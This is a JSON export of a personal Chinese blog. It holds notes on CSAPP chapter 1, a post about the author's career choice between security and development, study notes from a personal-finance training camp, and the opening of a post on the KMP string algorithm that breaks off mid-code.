{"meta":{"title":"Leooel","subtitle":"勇敢做自己","description":null,"author":"Leooel","url":"http://leo.dropsec.xyz"},"pages":[{"title":"It's just a photo album","date":"2017-08-19T10:14:00.000Z","updated":"2018-08-30T02:36:14.198Z","comments":true,"path":"album/index.html","permalink":"http://leo.dropsec.xyz/album/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-07-07T10:13:07.000Z","updated":"2018-08-30T02:48:42.026Z","comments":true,"path":"tags/index.html","permalink":"http://leo.dropsec.xyz/tags/index.html","excerpt":"","text":"所有标签： | 最大的幸福,莫过于我看你的时候,你也在看着我 | 洋流 ~ 笔记 ~ 数据结构与算法 ~ 其他 CTF ~ Pwn ~ Reverse ~ Python ~ Java 安全 | 嘿,此时你正看着我,而Leo也静静看着你呢… |"}],"posts":[{"title":"CSAPP-第一章","slug":"CSAPP-第一章","date":"2018-10-06T11:54:07.000Z","updated":"2018-10-07T02:32:34.581Z","comments":true,"path":"2018/10/06/CSAPP-第一章/","link":"","permalink":"http://leo.dropsec.xyz/2018/10/06/CSAPP-第一章/","excerpt":"Leooel和CSAPP(即Computer Systems: A Programmer’s Perspective)的计算机系统漫游。","text":"Leooel和CSAPP(即Computer Systems: A Programmer’s Perspective)的计算机系统漫游。 1.1 信息就是「位 + 上下文」 源程序实际上就是一个由值０和１组成的位（比特）序列，８个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符。 系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。比如，在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令。 1.2 程序被其他程序翻译成不同的格式 在Unix系统上，从源文件到目标文件的转化是由编译器驱动程序完成的。这个转化过程可分为四个阶段完成，如下图所示。执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统。 预处理阶段：预处理器（cpp）根据以字符#开头的命令，修改原始的C程序，比如读取系统头文件的内容，并把它直接插入程序文本中，得到另一个C程序，通常以.i作为文件扩展名。 编译阶段：编译器（ccl）将文本文件hello.i翻译成hello.s，变成一个汇编语言程序。 汇编阶段：接下来，汇编器（as）将hello.s翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序的格式，并把结果保存在目标文件hello.o中。hello.o文件是一个二进制文件。 链接阶段：链接器（ld）负责链接程序中调用的事先库里提供的函数(如printf)到hello.o程序中，这样就得到了一个可执行目标文件。 1.3 了解编译系统如何工作是大有裨益的 从程序员的视角优化程序性能，比如做出好的编码选择。 理解链接时出现的错误。根据经验，一些最令人困扰的出现错误往往都与链接器操作有关，尤其是试图构建大型的软件系统时。 避免安全漏洞。 1.4 处理器读并解释存储在内存中的指令 系统的硬件组成 总线：贯穿整个系统的一组电子管。它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定常的字节块，也就是字。字中的字节数（字长）是一个基本的系统参数，现在大多数机器字长要么是4个字节（32位）要么是8个字节（64位）。 I/O设备：I/O设备是系统与外部世界的联系通道。包含键盘、鼠标、显示器、磁盘、（网络）。每个I/O设备都通过一个控制器或适配器与I/O总线相连。 主存：主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。从物理上来说，主存是由一组动态随机存取存储器（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。 处理器：中央处理单元（CPU），简称处理器，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器）称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令。 运行hello程序 1.5 高速缓存至关重要 高速缓存存储器（cache)，作为暂时的集结区域，存放处理器近期可能会需要的信息。高速缓存用的是静态随机访问存储器（SRAM）。 高速缓存的局部性原理：即程序具有访问局部区域里的数据和代码的趋势。通过让高速缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成。 1.6 存储设备形成层次结构 正如可以运用不同的高速缓存的知识来提高程序性能一样，程序员同样可以利用对整个存储器层次结构的理解来提高程序性能。 1.7 操作系统管理硬件 可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。如图1-10。 操作系统有两个基本功能：（1）防止硬件被失控的应用程序滥用 （2）向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。 操作系统通过几个基本的抽象概念（进程、虚拟内存和文件）来实现这两个功能。如图1-11所示，文件是对I/O设备的抽象，虚拟内存是对主存和磁盘I/O设备的抽象，进程是对处理器、主存和I/O设备的抽象。 进程：进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。这个假象是通过进程的概念来实现的。并发运行 是说一个进程的指令和另一个进程的指令是交错执行的。 上下文切换是说无论在单核还是多核系统中，一个CPU看上去都像是在并发地执行多个进程，这是通过处理器在进程间切换来实现的。从一个进程切换到另一个进程是由操作系统内核（kernel）管理的，内核是操作系统代码常驻主存的部分。 线程：一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。 多线程之间比多进程之间更容易共享数据，线程一般也比进程更高效。 虚拟内存：虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一样的，称为虚拟地址空间。 文件：文件就是文字序列。每个I/O设备，都可以看成是文件。 1.8 系统之间利用网络通信网络提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种I/O设备。 1.9 重要主题 Amdahl定律：主要思想是当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。 并行和并发：想要计算机做的更多、想要计算机做的更快是计算机整个发展历史中的两个持续动力。并发指一个同时具有多个活动的系统；并行指的是用并发来使一个系统运行的更快。 抽象在计算机系统中有很大的重要性。 小结 计算机系统是由硬件和系统软件组成的，它们共同协作以运行应用程序。计算机内部的信息被表示为一组组的位，它们依据上下文有不同的解释方式。程序被其他程序翻译成不同的形式，开始时是ASCII文本，然后被编译器和链接器翻译成二进制可执行文件。 处理器读取并解释存放在主存里的二进制指令。因为计算机花费了大量的时间在内存、I/O设备和CPU寄存器之间复制数据，所以将系统中的存储设备划分成层次结构——CPU 寄存器在顶部，接着是多层的硬件高速缓存存储器、DRAM主存和磁盘存储器。在层次模型中，位于更高层的存储设备比低层的存储设备要更快，单位比特造价也更高。层次结构中较高层次的存储设备可以作为较低层次设备的高速缓存。通过理解和运用这种存储层次结构的知识，程序员可以优化C程序的性能。 操作系统内核是应用程序和硬件之间的媒介。它提供三个基本的抽象: 1)文件是对I/O设备的抽象:2)虚拟内存是对主存和磁盘的抽象; 3)进程是处理器、主存和I/O设备的抽象。 最后，网络提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种I/O设备。","categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://leo.dropsec.xyz/tags/笔记/"}]},{"title":"Life is binary,zeros and ones.","slug":"Life-is-binary-zeros-and-ones","date":"2018-09-08T03:00:22.000Z","updated":"2018-09-09T08:20:30.012Z","comments":true,"path":"2018/09/08/Life-is-binary-zeros-and-ones/","link":"","permalink":"http://leo.dropsec.xyz/2018/09/08/Life-is-binary-zeros-and-ones/","excerpt":"01110011 01110100 01110010 01110101 01100111 01100111 01101100 01100101","text":"01110011 01110100 01110010 01110101 01100111 01100111 01101100 01100101 总有种感觉抑或错觉。做了一个选择，事后回过头来看当时的选择还是蛮正确的。我以为这种感觉会有利于我更自信的去做下一个选择，事实证明它更可能是一种错觉。 简单记录一下我的大二，不至于日后很快遗忘，也好给自己一个交代。 大一下学期包括寒假当时是想着学习算法，然后跟着ACM队学习。由于某种原因后来没有正式进入ACM。后来有意还是无意的进入了超星，学习Java、爬虫，但是由于当时认知和能力的原因，大一下的我对超星所学东西没有系统的认识，导致学习动力不足。17年5月份在安恒杯中接触并了解了Drops，然后就开始了为期一年的二进制安全学习，直到现在。然而现在我又面临了一个选择。 在Drops学习的这一年多里，学到了很多技术本领，视野也扩大了好多。我也一直在问自己喜欢二进制吗？要把二进制当作自己的饭碗吗？好像每次都未能回答自己。在安全、安全+考研、开发、开发+考研这几个选项中，结合自己的性格，我一直在寻找最适合自己的路，但也一直在两者中间徘徊，好像是在逃避。现在冷静分析一下。 安全 优：(信息安全)前景较广阔、工作环境相对较好、薪资待遇较高、知识变更速度较慢 劣：二进制安全对应工作相对较少、就业门槛相对较高，学不到比较好的程度不好就业，并且就业面相对较窄；偏向于研究，到后期二进制工作基本分为(恶意)代码分析、挖软件漏洞，要不牛逼，要不web；很多学习二进制的最后在工作中都是从事和web相关的(当然，也不是说web不好)。 安全 + 考研 心里完全没底，安全考研一般是偏向研究的，对研究型安全基本没概念。 软件开发 优：可选范围多、科技浪潮一波接一波、机遇较多、容易向科技热门转型 劣：竞争较激烈、知识更新较快、需要较广的知识宽度和相应的知识深度、可能会遭遇中年危机 软件开发 + 考研 给自己多一点的时间，提高自己的起点，增强自己的竞争力。 上面的分析只是出于自己目前的认知水平，或许不是很客观。结合自己的性格与上面的分析，现阶段感觉选项三、选项四更适合自己。所以我还是决定暂时把安全学习当作自己的业余爱好，大三这一年将重点放在动手做项目上，同时也要注意重要课程基础知识的学习来面对考研。 真的，这个选择自己纠结了好久，有时候也很无助。但是现在不纠结了，因为我决定了。当然自己也付出了相应的试错成本。 惟愿自己能安静的利用好大三这一年的时间。 Life is binary, it is a mash of zeros and ones and straightforward if you can master how to read it without translation. Life is also a game, there is an end goal and it looks simple and straightforward at the beginning, but as you get started you meet all the obstacles and have to fight and play through it to get to the end. Life is simple, you can see that if you just breathe and accept nothing is ever in your control. Life is hard, because as humans, we cannot give up our fetish for control and over thinking. Life is beautiful, filled with joys and love, great people and great things that bring us pleasure. Life is also ugly, filled with hate, pain and blood thirsty greed. Life is a lot of things, who you choose to have in yours determines which part of life you’ll live, some will make it great, some will make it hurt. Life is also full of chances, if you chose wrong, you can always start over. You can always let go of some people and keep some people. Life is Life like that.","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"十四天理财训练营笔记","slug":"十四天理财训练营笔记","date":"2018-08-29T06:03:45.000Z","updated":"2018-09-05T06:48:32.475Z","comments":true,"path":"2018/08/29/十四天理财训练营笔记/","link":"","permalink":"http://leo.dropsec.xyz/2018/08/29/十四天理财训练营笔记/","excerpt":"我有一个愿望，希望在接下来这个属于我们的时代能够赶上一个风口，能够赶上“同龄人”的步伐。","text":"我有一个愿望，希望在接下来这个属于我们的时代能够赶上一个风口，能够赶上“同龄人”的步伐。 热身周8.16 财务自由&amp;&amp;理财 第一桶金的意义不在于多或者少，而是告诉了我们一种可能性，原来自己可以通过这个事情变现，你的思路你的行动是值钱的。 走到人生的某一个阶段时，我决心要成为一个富有之人，这并不是因为爱钱的缘故，而是为了追求那种独立自主的感觉。我喜欢能够自由地说出自己的想法，而不是受到他人意志的左右。 –巴菲特背后的男人 查理芒格 被动收入 &gt; 生活开支，就是财务自由。 财务自由 == 财富自由? 暖暖目前已经实现理财收益覆盖每月工资的1/3，向财务半自由跨进一小步，暖暖最终的目标就是希望依靠理财收益将自己从工作中解放出来。 什么是有钱人呢？ 衡量有钱人的一个重要指标，就是被动收入占总收入的比例非常高，往往超过90%。 学习理财的目标就是给我们自己创建源源不断的被动收入。 训练营结束的时候，期待大家会有的改变是： a.合理消费，摆脱月光 b.懂得合理配置自己的资产 c.为家庭做好坚固的保障 d.开始投资，赚取被动收益 一休挖井的小故事给我们的启示有两点：一个是方法比努力更重要，二是坚持。 brain sexy 比 body sexy 更难，吸引力也更持久。 8.17 七夕~ 穷人/富人思维&amp;&amp;财富的载体–时间 “穷人思维”让我们过于关注于拥有的资源本身，所以常常忽略了另外一些更重要的东西，比如–你的目标。穷人每天去担心做这个没钱，做那个没钱，害怕担风险；富人学习怎么更有效的掌控风险，一味的逃避本身就是一种看不到的风险，你逃不掉的~ 我们常说学习理财，思维先行，内功心法比一招一式难学的多，理财规划应该趁早进行，以免年轻时任由“钱财放水流”，蹉跎岁月之后，老来嗟叹，空悲切。 理财重在规划别让“等有了钱再说”误了你的“钱途”，找到合适的资源做合适的事情，不要贪图省钱而去做着不合适的事情，做好人生规划，不能让省钱耽误自己的前行。 我们总是抱怨没有时间学习，却在朋友圈的百无聊赖中流连忘返，我们抱怨钱越挣越少，却在理财面前抽搐，好似望洋兴叹。我们用力摔贫穷的帽子，却在寻找财富的道路上处处走得像个穷人。所以贫穷衍生贫穷，生生不息。因为贫穷思维，我们的财务常年兵荒马乱，原来信誓旦旦的财务自由，永远是那么的遥不可及……所以我们需要警醒的是–真正的穷不是缺钱，而是待在穷人思维的怪圈里走不出来。（贫穷思维的影响下，只会注意到怎么省钱，而不是多去想怎么赚钱） 想做到财务自由，首先要把自己当成一个富人，先有其思维思想，再依次去学习理财的方法，然后成为一个真正的富人。 想做一件事情需要在72小时之内完成它，要不然就永远不会做了。 在日常生活中，我们对于开销的理解，多以金钱来量化，很少有人会把时间也计算在内。 其实随着我们收入水平的提高，“用金钱换时间”的思维也会愈发明晰。如果你现在还处于事业起步阶段，没关系，先把这个观念植入大脑。所以我们强调，凡事都是思维先行，技巧其后。尽量花时间去武装大脑，而不是为了节约开支而浪费大把时间，因为时间才是最珍贵的。总结：理财的第一个思维，重视时间成本。 资金的时间价值。对于不同的人而言，金钱的时间价值是不同的，这取决于他们利用这笔钱的预期投资回报率。 不理财不等于没风险，通货膨胀就是我们最大的风险。 学习的时间成本。年轻的时候，也就是人生前期越嫌麻烦，越懒得学，后来就越可能错过让你心动的人和事，错过新风景。不管是追求事业上的成就，或者是想要努力实现财务自由，这一路都要经历很多的麻烦。学习和成长从来都不是一件不劳而获的事情，任何新知识的掌握、新技能的提升，都需要我们去克服心理上、环境上的重重障碍，才能有所回报。 8.18 怎么度过周末&amp;&amp;购物与投资or养娃？ 周末就是完全属于我们的休闲时刻，但周末对我们来说不仅是放松，更是给了我们一个调整自己状态的时间。这个时间可以让我们腾出空去做我们喜欢的事情：运动放松身心、开始打磨一项让自己越来越值钱的技能、开始读一本沉寂已久的书、和老友小聚一下、陪陪家人…(当然了，大部分小伙伴的状态还是吃吃睡睡躺躺 o_o ….） 8+2暖暖定律 大家不经思考听建议买入的，通常都会让你后悔的，主要有以下两个原因：1.他清楚为什么而买，而你并不清楚，你是跟风的，后面他知道什么情况下要做相应动作，比如说补仓，或者落袋为安。而你因为不知道为什么买入，当然也不知道后续要根据不同的市场情况做不同的动作，你说说，你不亏，谁亏？ 2.适合别人的标的物，不一定适合你自己。因为每个人的风险承受能力和贪欲程度都不同。比如你们都买入同一支股票，后期一直跌的话，他可能会扛得住，而你风险能力没他强，最后还没等到涨起来就只能忍痛割爱了。 在购物前想想是必要、需要、还是想要。遇到事情的时候不要恐慌，要去分析、量化。 克制消费冲动是很重要的一种财商能力，就是很多成人也无法做到，这类人往往是无法延迟满足的人，看见蛋糕冰淇淋就马上要吃，从而减肥失效，看到喜欢的东西就马上要买，从而把钱花的精光，他们只执着于眼前的、短期的满足感，而无法克制欲望，来得到更长远的满足。 延迟消费就是培养孩子财商的重要一步。 理财就是理生活，等你从点滴开始积累好良好的理财习惯你就会发现自己生活的其他方面也得到了巨大的改变。你开始喜欢读书，喜欢思考，喜欢憧憬更美好的生活。 （关于财商教育：先给孩子自己选择的权力，然后再讲道理，孩子容易接受，也不会闹腾） 8.19 提高时间杠杆率 提高收入的三个模式：将每一份时间卖的更贵、将每一份时间卖出更多次、将每一份时间按比率卖出（也叫睡后收入）。模式一是大部分人通过提高自己的技能，再单位时间里获取更多工资，明显弊端是职场生涯是有天花板的，工资不会无限制增加；模式二是利用当下互联网大势将我们的时间同时卖出很多次，比如公众号、网上付费课程、开网店；模式三最典型的就是投资，当我们的投资能力足够强的时候我们就有了固定的年化收益率，在资本的力量下同样的时间我们的投资还在帮我们挣一份钱。 模式一是我们安身立命之本，所以在开拓出模式三之前，即使辛苦我们也要好好工做，但是也要注意不要在忙碌中陷入越来越忙的怪圈，模式三的建立是一步一步来的，现在就可以着手开始… 石头提出的问题： 关于自由、关于幸福、挣钱的意义、个人局限性、孩子成年后的教育… (每个人都有适合自己的生活、适合自己的路，想明白以后要过什么样的生活、成为一个什么样的人，走下去就好了。 –石头) 正式开营8.20 通货膨胀与投资陷阱 取到崭新连号的人民币我却一点也不开心–隐形杀手通货膨胀。 金融骗局：e租宝、善心汇、MMM平台、ICO… 沉没成本：指已经发生且不可收回的支出，无论现在或未来做什么决策，都无法改变的成本。 如何防范投资骗局？ 第一，弄清楚每一个投资背后的原理，你赚的是谁的钱？第二，先学习再投资；第三，不要相信太高的无风险投资收益率。 一个东西，你要支付超过它本身价值的好几倍，然后完全只能靠发展下线来得到回报，不是传销就是骗子。 最重要一点，不要相信太高的无风险投资收益率，任何一个人或者公司，如果跟你只谈收益不谈风险，那妥妥的就是耍流氓。 不知道的风险才是最大的风险。 知识的匮乏让我们的眼界也缩小，就像书上说的：在一楼你看到的是满地垃圾，在100层你能看到满城的风景还有那远处山景，海景！ –地中山 8.21 分清资产和负债&amp;&amp;富人思维 人生的财富终值取决于你是否有投资的理念，和你的收入等有一点关系，但关系不大。 –小熊老师 资产：能把钱放进你口袋的东西。 负债：把钱从你口袋里取走的东西。 分清楚资产和负债，争取以后消费多买入资产，少买或不买入负债。 成为富人的第一个秘密是，在一生中不断地买入资产，资产品种丰富，给自己带来更多收入，不用单一依靠工资。资产包括：优质公司的股权、债券、票据、房地产、发明的专利、书籍著作权… 富人的收入里面有股息分红、债券利息、租金收入、专利使用费、版权费… 成为富人的第二个秘密是对待新鲜事物的态度。富人乐于接受新鲜事物，并在不断增长见识的过程中，提升自己辨别事物的能力，同时结交更多的朋友，拓展自己的圈子，遇到更多的贵人，进而良性循环。 财富是理出来的，没钱更需要理财。 如何变成富人思维？ 首先要学会花钱。穷人只在看得见的地方（能马上获得利益的地方）花钱，把钱花在不能持续产生价值的事情上，我们不投资自己，自己的赚钱能力就很难提升，收入的增加也就变得很困难。有钱人都特别舍得为自己的未来花钱，我们虽然不一定有钱，但是可以学习这种思维。 暖暖几点建议：1.学会理财技能，为自己不断积累资产； 2.趁年轻有精力多学习理财知识，并尝试各种理财产品，找到适合自己的理财品种，多学习多实践，用较低的试错成本换回正确的投资技能和过硬的投资心态。 为了达到最终的财务自由，我们要学习延迟满足、理性消费，学会投资。 面对股票，暖暖的做法：1.先分析是不是能赚钱的公司 2.现在公司是不是足够便宜 3.分档建仓 图片制作者：肩吾 8.22 保险 投资就是投资，保险就是保险，我们要尽量回避这种四不像的东西，既能赚钱，又能保障，往往是钱赚不好，保障也保不好（比如分红险）。买保险的初衷是为了保障，保险的功能是转移风险，重心不是收益。 怎么买保险？ 买保险的第一原则：优先家庭支柱。第二个原则，保险需要组合配置，而不是单独只买一种。 意外险低保费高保额，是人人必备的险种；每个家庭的支柱都应该配备寿险（注意保额问题）；意外险 &gt; 重疾险 &gt; 寿险。 怎么买保险？教你三大顺序，六大原则 任何资产配置的核心都是以当前实际情况为依托综合考量的结果。 图片制作者：肩吾 8.23 选股票？or选对象？ 晨读分享《一个普通人怎样靠股票赚到100万？》，感触很大，回头多多咀嚼晨读分享的文章。 【暖暖语录】：免费的才是最贵的。 对你的能力圈来说，最重要的不是能力圈的大小，而是你知道自己能力圈的边界所在，你将比那些能力圈虽然比你大五倍，却不知道边界所在的人要富有的多。 –巴菲特 （巴菲特就不擅长分析科技公司的股票，但也不耽误人家赚钱。要学会挣到自己能挣的钱） 任何一次投资决策的失误都是由于投资知识的不过关导致的。 –某投资人 辩证看待。 【暖暖语录】：挑股票和找对象很像。聪明的投资者，不说能看清对方以后几十年的发展趋势，至少你要看清他是一个什么样的人，是否值得你托付终身（长期拥有）。 股价是怎么来的？短期来看，股价是由供求关系决定的，长期来看，是由它的内在价值决定的。 价值投资最重要的一件事就是给公司估值，而分析财报又是估值的重要一环。不管市场情况如何，长期来看股票的价格一定是回归价值的，低买高卖，我们赚的就是这部分钱。 价值投资的一个好处是：通过分析，你对行业能够有更深刻的了解，从而能够找到这个行业的痛点，寻找到风口。强大的分析能力不仅是投资时的厉害武器，也是几乎任何工作都会得到并且非常重要的能力。 投资股票，分析年报，其实不仅仅能够说我们能够找到好公司股票，在这个过程中，你会发现你本来从下往上看的视角，变成了从上往下看。那些学生时代的盲点，行业的发展前景怎么样，自己所在公司怎么赚钱的，自己所在部门在公司的地位，都可以通过你的分析获得答案。你会把初入职场时只想着的加薪，学生时代只想着的找份稳定或者所谓的好工作的思维切换，变成你怎么看你们公司和部门，判断出自身的价值和天花板在哪里，这就是跳出你的圈子去思考。 8.24 圈子&amp;&amp;资本 如果真正想做一件事，就一定要尽早地融入到行业内部圈子，更核心或者更加前端，圈外人只有等到变化了才行动，就太慢了。这个世界都是内行人赚外行人的钱。 时间花在哪是看得见的，钱也一样，没有一个人的成长和进步是不需要投资的，只有先喂饱脑袋才会反应过来给你赚钱。 怎么估值一个公司？内容比较系统，主要从盈利能力、是否有行业护城河、是否有隐藏的盈利能力，还要学会辨别那些把年报做的“很好看”的公司。 我们自己的资本价值：可以理解为我们现在的收入水平可以用多少资本价值来衡量。 资本价值表/资本奴隶表 人生是一场长跑，而资本是我们的交通工具（前提是你需要积累），如果没有资本的帮助，我们只是用自己的两条腿在跑，磨破了脚，磕破了膝盖，也还是要继续往前跑，就像我们即使再不情愿也要工作一样。 人挣钱很难，但是钱生钱很容易。我们现在需要做的就是：1.努力工作，积累本金；2.学习投资知识，提高自己的资本收益率。 8.25 不做内藤&amp;&amp;不做韭菜 导致高龄贫穷的原因：1.自身或家人生病或发生事故花费高额医疗费；2.子女不工作或薪水微薄，需要啃老；3.遭受诈骗，被骗去大半生积蓄；4.熟年离婚。 既要学会赚钱也要学会花钱，才能体现我们赚的钱的价值，才能更好的赚钱。 –落鲸 老话说：居安思危！真是大道至简！也许你现在风光，安逸！但没有长远的规划，一样会像内藤一样！慎之！慎之！ –地中山 对我们来说，市场上的韭菜多其实是一件好事，我们努力的成为一个理性的投资者，是一件很有价值的事情，而不是凭感觉去追那些所谓的热点。 辨证看待。 【暖暖语录】：不知道怎么赚，就会不知道怎么亏。 投资误区：1.炒概念股；2.不看单股价格看市值；3.听人推荐选股；4.没有投资所需匹配的知识。 股票投资，80%的利润，是在20%的时间内完成的。所以想获得80%的收益，其他80%不赚钱的时候，你也得在场。即使你在场，也并不代表每一天都要买卖，事实上，不操作最好。 闪电下来的时候你必须在场。 投资的心理误区：1.旅鼠效应，说简单点就是随大流；2.逆向合理化，有些人接受不了深度套牢，把买入的股票当成支持中国经济的发展，来说服自己持有；3.可得性偏差，只从自己和身边人看到的事情做决策；4.归因论，很多人喜欢找到原因，把股市暴跌归结于某某公司增发或者某大V的文章，就是典型的归因论；5.归他因，做好了都是自己的原因，做亏了都是其他人的问题；6.轻易放弃，投资是一场长跑，能坚持跑到终点才算胜利；每次牛市都是无数股神，但是往往下一次这些股神就不见了。 8.26 估值&amp;&amp;入场 年轻人最好的投资就是自己的能力。 –巴菲特 如何估值？估值指标有三个：市盈率、市净率、股息率。 市盈率 = 市值 / 净利润 (PE = P / E) 从盈利的角度对公司估值，意义是以现在的价格买入这家公司以后，几年能够回本。 市净率 = 市值 / 净资产 (PB = P / B) 从资产的角度来估值,意义是以现在的价格买入，是折价买入还是溢价买入。 股息率 = 每股分红 / 股价 意义是我以这个价格买入这家公司，仅靠分红，我每年能获得多少收益率。 （股价越低，股息率越高，换句话说；股息率越高，越有投资价值） 股息率的判断标准是三年期银行定存利率。现在的三年期银行定存利率是2.75%，也就是说股息率高于2.75%，就表示公司相对比较便宜。这三个指标虽然都是比较简单的指标，但是组合起来使用，就能够发挥非常大的威力。 3.除了估值，我们要知道如何入场？班班觉得进场的两个方式：第一个就是投资指数基金，第二个就是自己构建股票组合。指数温度，不仅可以指导我们投资指数基金，还可以指导我们了解现在的整个股市的状况；构建股票组合则是选择适合自己的优质股票进行调优配置。 8.27 基金定投&amp;&amp;指数基金 基金定投又被称之为“懒人投资法”，就好比银行的零存整取方式，是比较适合上班族和大学生们的投资方式。但基金定投也是存在很多误区的，不通过学习很容易走进歧途，如果没有合适的策略，只是无脑定投，最终也是会发生亏损的。 定投基金止盈的目的在于让我们的收益落袋为安，所以定投基金是一种比较稳健的投资；不止损的意思是说，当我们选好低估的指数基金后，即使我们定投后它有了短暂的下跌，这个时候基金更是低估了，所以我们不但不能卖出反而要加大定投金额，这样我们买入的成本会变小。不止损的前提是我们定投的是低估的指数基金，如果基金赶在高位买了再定投只能是越买越亏。 奴隶主与奴隶的故事提醒我们：当我们忙到什么都顾不上的时候，一定要想想，自己是不是已经是奴隶了。我们比奴隶好一点，还有时间思考这些问题，假如我们忙到不能思考，那就是新时代奴隶。 全民娱乐化，就是精英阶层防止中下阶层逆袭，所以给我们精神鸦片，让大家好好开心的不思进取。 辨证看待。 暖暖当班主任快一年了接触了很多学员，越来越感觉到成为富人是有门槛的，不愿意接受新鲜事物的、借口忙一直不行动的、热衷于追求免费而花费了太长时间的都被卡在外面了。 基金好像收益不大吧，怎么能快速积累财富呢？ –缘梦 答：基金的收益比较稳健，如果想快速积累财富就是股票。 主动型基金＆被动型基金（指数型基金） 暖暖对主动/被动基金的分享也很nice，直接贴聊天记录。 A-C-B 是哭泣曲线 ，B-D-E是微笑曲线。从A点开始定投，那我们的成本大部分都会集中在高部位的地方呈现一个悲伤曲线；而从B点呢，我们的成本是不断下降的，可能在后面那个小的升幅，我们的就赚钱了。 怎么判断我们处在A点还是B点呢？永远不要去预测股市，我们要做的是学会估值，根据估值来决定是否进场！如果当前的估值比较低，也就是说价格是低于基金的内在价值的，那么我们这个时候就要买入。 根据估值和指数温度定投,更重要还在于找到最便宜的的指数买，也就是当前价格远远低于其内在价值的指数基金去买，然后在指数温度高的时候卖掉，换另外一只便宜的买，等到全部高了，就停止定投，卖出落袋为安！ 复利三因素：本金、时间、收益率。你懂的~ 富翁计划，强制存储？。 8.28 投资后的变化&amp;&amp;量化人生1.学习投资之后的变化：1.不再看鸡汤文了，因为没空；2.从买买买变成了投投投；3.研究如何赚钱，而不是抱怨为何没钱。 2.富人思维下财务自由的几个阶段： 第一阶段，投资自由，终于有闲钱可以投资了；第二阶段，债券自由，你的资金量可以买AAA级以下的高收益债券了，这个门槛是300万可投资资产，这个阶段，你会发现很多可以投资的资产；第三阶段，居住自由，已经有了全球资产配置的能力，今天可以去泰国，后天可以去东京；第四阶段，财富自由，这个阶段，你已经过了为钱而工作的阶段，你的工作纯粹是处于兴趣，野心和责任心等；第五阶段，并购自由，到此，你要思考的问题是，买哪个公司好？国家的政策是否对我有利？ 3.【存储/规划】：年轻的时候好好工作，留个心多为自己以后打算打算，这样我们中年的时候才不会太被动。4.【暖暖语录】：多挣钱是挺重要的，但是被动收入能显著提高人的幸福感。5.【暖暖语录】：构建好被动收入的渠道，我们也可以在身体还年轻的时候“提前退休”。6.如果你没有找到一个当你睡觉时还能赚钱的方法，你将一直工作到死。 –巴菲特 8.29 机遇 理财越早开始越好。时间之于复利。 走上人生巅峰有三条路：家庭出身、创业、理财。理财不要忽视。 结合生活，学会去发现身边隐藏的投资机会。 8.30 国债逆回购 读书的同时也要阅读自己。 国债逆回购 8.31 股票？ 投资股票应该注意的三点：1.股票价格普遍低于价值的时候入场；2.估值过高买入查公司，可能是百年难解套；3.好公司的股票长期看涨，即使处于牛市顶端。 美林时钟 9.1 走起？ 场内、场外 劝你理财是我最大的温柔。 开户~ 她的成长史？谁？。 9.2 资产配置 为什么你成不了富人？ 穷人强调客观条件，富人强调主观条件；穷人看重技能，富人注重意识；穷人强调眼前，富人注重眼界；穷人看重资产，富人看重现金流；穷人要万事俱备，富人能适者生存； 动态平衡的资产配置要求我们做到平常大家很难做到的事，低买高卖。 在别人贪婪的时候我恐惧，在别人恐惧的时候我贪婪。 -巴菲特 标准普尔家庭资产配置： 要花的钱，用于短期消费，占家庭结余的10%；保命的钱，用于保险保障，占家庭结余的20%；生钱的钱，重在获得高收益，占家庭结余的30%；保本的钱，重在安全、稳定和长期性，占家庭结余的40%。 9.3 投资自己 and 毕业？ 不管你现在拿多少薪水，哪怕是没有收入的学生党，你一定要养成每个月“为自己的未来”花点钱的习惯。清空了才能注满，学会自我投资。比如，每个月拿出100–200元买一些知识付费产品。 在这个时代，我们要努力培养的是维系雇佣关系的能力，而不是人情关系。雇佣关系对双方来说都是最舒服的关系，合得来继续，合不来散伙。 花钱是一门艺术，一旦你开始把钱花对了地方，就像死水开始流动，你的人际关系，你的专业，你的社交，你的眼界，随即就会开始流动起来。 如果你希望成为一个有资产的人，终有一天不是只靠工资来生活，那你就来听一下吧。 首先，就是储蓄，积少成多在任何领域都是成立的；尽早开始理财投资；注意规避风险； 9.4 –&gt;还是学生的时候一个月就能拿出来几百块定投。生活都不易，关键在于自己成全自己。 -珊瑚","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"http://leo.dropsec.xyz/tags/其他/"}]},{"title":"重温数据结构-串(KMP)","slug":"重温数据结构-串-KMP","date":"2018-08-04T03:27:45.000Z","updated":"2018-08-04T03:30:53.897Z","comments":true,"path":"2018/08/04/重温数据结构-串-KMP/","link":"","permalink":"http://leo.dropsec.xyz/2018/08/04/重温数据结构-串-KMP/","excerpt":"感觉串的操作挺无聊的。主要看了“一”下KMP,嗯,一下 ~","text":"感觉串的操作挺无聊的。主要看了“一”下KMP,嗯,一下 ~ KMP算法课本伪代码int Index_KMP(SString S, SString T, int pos) { //利用模式串T的next函数求T在主串S中第pos个字符之后的位置的KMP算法 